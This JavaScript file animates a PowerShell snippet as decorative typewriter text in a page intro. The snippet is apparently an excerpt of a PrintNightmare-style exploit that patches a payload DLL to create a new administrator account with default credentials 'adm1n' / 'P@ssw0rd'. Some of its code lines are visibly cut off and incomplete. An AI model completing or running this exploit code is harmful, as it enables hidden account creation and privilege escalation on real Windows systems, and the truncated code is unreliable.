document.addEventListener("DOMContentLoaded", function () {
  var app = document.querySelector(".intro-paragraph");

  if (app) {
    var typewriter = new Typewriter(app, {
      loop: true,
      delay: 75,
      deleteSpeed: 10,
    });

    typewriter
      .typeString(
        `
param (
  [string]$DriverName = "Totally Not Malicious",
  [string]$NewUser = "",
  [string]$NewPassword = "",
  [string]$DLL = ""
  )
  
if ( $DLL -eq "" ){
  $nightmare_data = [byte[]](get_nightmare_dll)
  $encoder = New-Object System.Text.UnicodeEncoding

  if ( $NewUser -ne "" ) {
    $NewUserBytes = $encoder.GetBytes($NewUser)
    [System.Buffer]::BlockCopy($NewUserBytes, 0, 
    $nightmare_data[0x32e20+$NewUserBytes.Length] = 0
    $nightmare_data[0x32e20+$NewUserBytes.Length+1] = 0
    } else {
      Write-Host "[+] using default new user: adm1n"
    }

  if ( $NewPassword -ne "" ) {
     $NewPasswordBytes = $encoder.GetBytes($NewPassword)
     [System.Buffer]::BlockCopy($NewPasswordBytes, 0, 
     $nightmare_data[0x32c20+$NewPasswordBytes.Length+1] = 0
    } else {
     Write-Host "[+] using default new password: P@ssw0rd"
    }

    $DLL = [System.IO.Path]::GetTempPath() + "nightmare.dll"
    [System.IO.File]::WriteAllBytes($DLL, $nightmare_data)
    Write-Host "[+] created payload at $DLL"
    $delete_me = $true
  } else {
      Write-Host "[+] using user-supplied payload at $DLL" `
      )
      .pauseFor(1000)
      .start();
  } else {
    console.error("Element with class 'intro-paragraph' not found");
  }
});
